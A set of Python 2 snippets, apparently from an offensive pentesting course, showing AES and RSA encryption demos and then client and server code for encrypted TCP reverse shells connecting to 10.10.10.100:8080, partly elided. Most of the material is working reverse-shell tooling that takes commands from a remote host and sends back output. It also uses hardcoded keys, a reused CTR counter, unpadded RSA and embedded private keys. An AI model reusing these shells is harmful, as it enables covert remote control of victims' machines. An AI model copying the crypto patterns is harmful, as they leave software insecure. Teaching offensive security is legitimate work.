["```\n# Python For Offensive PenTest\n\n# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7\n# http://www.voidspace.org.uk/python/modules.shtml#pycrypto\n\n# Download Pycrypto source\n# https://pypi.python.org/pypi/pycrypto\n# For Kali, after extract the tar file, invoke \"python setup.py install\"\n\n# AES Stream\n\nimport os\nfrom Crypto.Cipher import AES\n\ncounter = os.urandom(16) #CTR counter string value with length of 16 bytes.\nkey = os.urandom(32) #AES keys may be 128 bits (16 bytes), 192 bits (24 bytes) or 256 bits (32 bytes) long.\n\n# Instantiate a crypto object called enc\nenc = AES.new(key, AES.MODE_CTR, counter=lambda: counter)\nencrypted = enc.encrypt(\"Hussam\"*5)\nprint encrypted\n\n# And a crypto object for decryption\ndec = AES.new(key, AES.MODE_CTR, counter=lambda: counter)\ndecrypted = dec.decrypt(encrypted)\nprint decrypted\n```", "```\n>>>\n]ox:|s\nHussam\n>>>\n```", "```\n# Python For Offensive PenTest# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7\n# http://www.voidspace.org.uk/python/modules.shtml#pycrypto\n\n# Download Pycrypto source\n# https://pypi.python.org/pypi/pycrypto\n# For Kali, after extract the tar file, invoke \"python setup.py install\"\n\n# AES - Client - TCP Reverse Shell\n\nimport socket \nimport subprocess \n\nfrom Crypto.Cipher import AES\n\ncounter = \"H\"*16\nkey = \"H\"*32\n\ndef encrypt(message):\n    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)\n    return encrypto.encrypt(message)\n\ndef decrypt(message):\n    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)\n    return decrypto.decrypt(message) \n\ndef connect():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n    s.connect(('10.10.10.100', 8080)) \n\n    while True: \n        command = decrypt(s.recv(1024))\n        print ' We received: ' + command\n\n...\n```", "```\n# Python For Offensive PenTest\n\n# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7\n# http://www.voidspace.org.uk/python/modules.shtml#pycrypto\n\n# Download Pycrypto source\n# https://pypi.python.org/pypi/pycrypto\n# For Kali, after extract the tar file, invoke \"python setup.py install\"\n\n# AES - Server- TCP Reverse Shell\n\nimport socket \nfrom Crypto.Cipher import AES\n\ncounter = \"H\"*16\nkey = \"H\"*32\n\n...\n\ndef connect():\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n    s.bind((\"10.10.10.100\", 8080)) \n    s.listen(1) \n    print '[+] Listening for incoming TCP connection on port 8080'\n    conn, addr = s.accept() \n    print '[+] We got a connection from: ', addr\n\n...\n```", "```\n# Python For Offensive PenTest\n\n# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7\n# http://www.voidspace.org.uk/python/modules.shtml#pycrypto\n\n# Download Pycrypto source\n# https://pypi.python.org/pypi/pycrypto\n# For Kali, after extract the tar file, invoke \"python setup.py install\"\n\n# Generate Keys\n\nfrom Crypto.PublicKey import RSA \nnew_key = RSA.generate(4096 ) # generate RSA key that 4096 bits long\n\n#Export the Key in PEM format, the PEM extension contains ASCII encoding\n\npublic_key = new_key.publickey().exportKey(\"PEM\") \nprivate_key = new_key.exportKey(\"PEM\") \nprint private_key\nprint public_key\n```", "```\n# Python For Offensive PenTest\n\n# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7\n# http://www.voidspace.org.uk/python/modules.shtml#pycrypto\n\n# Download Pycrypto source\n# https://pypi.python.org/pypi/pycrypto\n# For Kali, after extract the tar file, invoke \"python setup.py install\"from Crypto.PublicKey import RSA\n\n# RSA ENC-DEC\n\nfrom Crypto.PublicKey import RSA\n\ndef encrypt(message):\n    publickey = open(\"public.pem\", \"r\")\n    encryptor = RSA.importKey(publickey)\n    global encriptedData\n    '''\nThe encrypt function, will take two arguments, the second one can be discarded\n>>that's why we passed (message,0) arguments\n\nThe returned value is a tuple with two items. The first item is the\ncipher text. The second item is always None.\n>>that's why print encriptedData[0]\n\nRef: https://pythonhosted.org/pycrypto/Crypto.PublicKey.RSA._RSAobj-class.html#encrypt\n    '''\n    encriptedData=encryptor.encrypt(message,0)\n    print encriptedData[0]\n\nencrypt('Hussam')\n\ndef decrypt(cipher):\n    privatekey = open(\"private.pem\", \"r\")\n    decryptor = RSA.importKey(privatekey)\n    print decryptor.decrypt(cipher) \n\ndecrypt(encriptedData)\n```", "```\n...\nencrypt('H'*512)\n...\n```", "```\n# Python For Offensive PenTest\n\n# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7\n# http://www.voidspace.org.uk/python/modules.shtml#pycrypto\n\n# Download Pycrypto source\n# https://pypi.python.org/pypi/pycrypto\n# For Kali, after extract the tar file, invoke \"python setup.py install\"\n\n# RSA - Client - TCP Reverse Shell\n\nimport socket \nimport subprocess \n\nfrom Crypto.PublicKey import RSA\n\ndef encrypt(message):\n    #Remember that here we define the server's public key\n    publickey ='''-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----'''\n\n    encryptor = RSA.importKey(publickey)\n    global encriptedData\n    encriptedData=encryptor.encrypt(message, 0)\n    return encriptedData[0]\n\ndef decrypt(cipher):\n    #Remember that here we define our (the target's) private key\n    privatekey = '''-----BEGIN RSA PRIVATE KEY-----\n...\n-----END RSA PRIVATE KEY-----'''\n\n    decryptor = RSA.importKey(privatekey)\n    dec = decryptor.decrypt(cipher) \n    return dec\n\ndef connect():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n    s.connect(('10.10.10.100', 8080)) \n\n    while True:\n\n        command = decrypt(s.recv(512))\n        print ' We received: ' + command\n...\n```", "```\n...     \n if len(result)>512:\n                for i in range(0, len(result), 512):\n                    chunk = result[0+i:512+i]\n                    s.send( encrypt (chunk ) )\n\n            else:\n                s.send( encrypt (result ) ) \n...\n```", "```\n# Python For Offensive PenTest\n\n# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7\n# http://www.voidspace.org.uk/python/modules.shtml#pycrypto\n\n# Download Pycrypto source\n# https://pypi.python.org/pypi/pycrypto\n# For Kali, after extract the tar file, invoke \"python setup.py install\"\n\n# Hybrid - Server- TCP Reverse Shell\n\nimport socket \nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import AES\nimport string\nimport random\n\ndef encrypt_AES_KEY(KEY):\n\n    publickey =\"\"\"-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----\"\"\"\n\n    encryptor = RSA.importKey(publickey)\n    encriptedData=encryptor.encrypt(KEY, 0)\n    return encriptedData[0]\n\n```", "```\n...\n\ndef connect():\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n    s.bind((\"10.10.10.100\", 8080)) \n    s.listen(1)                                                        \n    print '[+] Listening for incoming TCP connection on port 8080'\n    conn, addr = s.accept() \n    print '[+] We got a connection from: ', addr\n    global key\n    key = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\\$%&/()=?{[]}+~#-_.:,;<>|\\\\') for _ in range(32))\n    print \"Generated AES Key \" + str(key)\n    conn.send ( encrypt_AES_KEY(key) )\n    global counter\n    counter = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\\$%&/()=?{[]}+~#-_.:,;<>|\\\\') for _ in range(16))\n    conn.send ( encrypt_AES_KEY(counter) )\n ...\n```", "```\n# Python For Offensive PenTest: A Complete Practical Course - All rights reserved \n# Follow me on LinkedIn https://jo.linkedin.com/in/python2\n\n# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7\n# http://www.voidspace.org.uk/python/modules.shtml#pycrypto\n\n# Download Pycrypto source\n# https://pypi.python.org/pypi/pycrypto\n# For Kali, after extract the tar file, invoke \"python setup.py install\"\n\n# Hybrid - Client - TCP Reverse Shell\n\nimport socket \nimport subprocess \n\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import AES\n\ndef GET_AES_KEY(KEY):\n    privatekey = \"\"\"-----BEGIN RSA PRIVATE KEY-----\n...\n-----END RSA PRIVATE KEY-----\"\"\"\n\n    decryptor = RSA.importKey(privatekey)\n    AES_Key = decryptor.decrypt(KEY) \n    return AES_Key\n...\ndef connect():\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n    s.connect(('10.10.10.100', 8080))\n    global key, counter\n    x = s.recv(1024)\n    key = GET_AES_KEY( x )\n    print \"Generated AES Key \" + str(key)\n    y = s.recv(1024)\n    counter = GET_AES_KEY( y )\n     while True: \n        command = decrypt(s.recv(1024))\n        print ' We received: ' + command\n\n...\n```"]